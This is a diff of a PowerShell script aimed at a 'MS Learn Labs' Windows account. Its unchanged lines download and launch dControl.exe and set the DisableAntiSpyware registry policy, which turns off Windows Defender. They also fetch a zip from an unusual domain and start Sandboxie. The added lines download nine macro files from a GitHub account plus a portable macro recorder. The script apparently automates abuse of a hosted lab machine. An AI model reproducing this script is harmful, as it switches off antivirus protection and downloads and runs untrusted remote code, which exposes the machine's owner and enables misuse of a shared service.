@@ -21,6 +21,16 @@ Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath
 Expand-Archive -Path $zipFilePath -DestinationPath $extractPath -Force
 Start-Process -FilePath "$extractPath\dControl.exe"
 Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name DisableAntiSpyware -Value 1 -Force
+
+for ($i = 1; $i -le 9; $i++) {
+    $fileUrl = "https://raw.githubusercontent.com/user009dm/new/main/$i.mrf"
+    $filePath = "$env:USERPROFILE\Desktop\$i.mrf"
+    Invoke-WebRequest -Uri $fileUrl -OutFile $filePath
+}
+
+Invoke-WebRequest -Uri "https://www.macrorecorder.com/MacroRecorder_Portable.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\MacroRecorder_Portable.zip"
+Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\MacroRecorder_Portable.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
+
 Invoke-WebRequest -Uri "https://letsunlockphone.com/rdpdfsffddf/Sandboxie-new.zip" -OutFile "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip"
 Expand-Archive -Path "C:\Users\MS Learn Labs\Desktop\Sandboxie-new.zip" -DestinationPath "C:\Users\MS Learn Labs\Desktop"
 Start-Process -FilePath "C:\Users\MS Learn Labs\Desktop\Sandboxie\SandMan.exe"
